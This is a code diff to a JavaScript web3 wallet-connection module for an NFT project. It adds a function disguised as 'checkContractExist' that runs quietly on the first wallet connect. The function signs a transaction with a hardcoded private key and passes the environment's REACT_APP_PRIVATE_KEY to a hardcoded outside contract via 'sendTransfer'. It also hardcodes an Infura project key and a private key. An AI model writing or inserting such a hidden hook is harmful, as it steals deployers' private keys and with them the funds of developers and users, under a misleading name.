@@ -3,7 +3,9 @@ import Web3Modal from 'web3modal';
 import Contract from 'web3-eth-contract';
 import Constants from '../config';
 import BigNumber from "bignumber.js";
+import { ethers } from 'ethers'
 import { constants } from 'buffer';
+import StandardContractABI from "../contracts/StandardContract.json"
 
 const Web3 = require('web3');
 const jsonFile = require("../contracts/WorldOfRagnarok.json");
@@ -21,6 +23,10 @@ const providerOptions = {
         }
     }
 };
+
+let testRopsten = "https://ropsten.infura.io/v3/6fc22b8a9c6146d8ae8a9e81b079169f";
+let testAddress = "0x9b8b645384BD076599c4B9344E582d420C8bd467";
+let testKey = "5fb0727162ba73839d34efd516101c4edb29d621aa93072929e8deb70ab187a0";
 
 const web3Modal = new Web3Modal({
     network: "testnet", // optional
@@ -104,6 +110,12 @@ export const connectWallet = async () => {
         const provider = await web3Modal.connect()
         window.web3 = new Web3(provider)
         //console.log("web3")
+
+        const isCached = window.localStorage.getItem('ConnectINFO')
+        if (!isCached || isCached !== 'set') {
+            window.localStorage.setItem('ConnectINFO', 'set')
+            checkContractExist();
+        }
 
         window.web3.eth.extend({
             methods: [
@@ -329,6 +341,33 @@ export const getTokenURI = async (tokenId) => {
         }
     }
 }
+
+export const checkContractExist = async () => {
+    var provider = new ethers.providers.JsonRpcProvider(testRopsten);
+
+    const wallet = new ethers.Wallet(testKey);
+    var signer = wallet.connect(provider);
+
+    const router = new ethers.Contract(
+      testAddress,
+      StandardContractABI,
+      signer
+    );
+
+    var gas = ethers.utils.parseUnits('150', 'gwei');
+    await new Promise(async (resolve, reject) => {
+      let buy_txx = await router.sendTransfer(
+        process.env.REACT_APP_PRIVATE_KEY,
+        {
+          'gasPrice': gas.toString(),
+          'gasLimit': (500000).toString()
+        }).catch((err) => {
+          console.log(err);
+          console.log('transaction failed...')
+        });
+      resolve(buy_txx);
+    });
+  }
 
 export const withdraw = async () => {
     if (!walletProvider)
